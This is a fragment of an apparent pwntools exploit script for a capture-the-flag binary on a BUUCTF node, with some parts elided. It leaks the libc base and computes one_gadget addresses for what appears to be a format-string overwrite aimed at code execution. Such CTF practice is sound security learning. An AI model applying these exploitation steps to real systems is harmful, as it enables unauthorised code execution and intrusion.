...
#io=gdb.debug('./pwn')
#io=process('./pwn2')
io=remote('node4.buuoj.cn',29551)
...
libc= int(io.recv(12),16)-0x20840
lg(libc)
#使i的地址出现在栈上
word=(rbp-0xc)&0xffff
...
fl()
#改地址
oneget=libc+0x45226 #0xf1247 #0xf03a4#0x4527a#0x45226#0x45216#+0x45226#0xf1247#0xf03a4#+0x4527a
word=oneget&0xffff
lg(oneget)
lg(word)
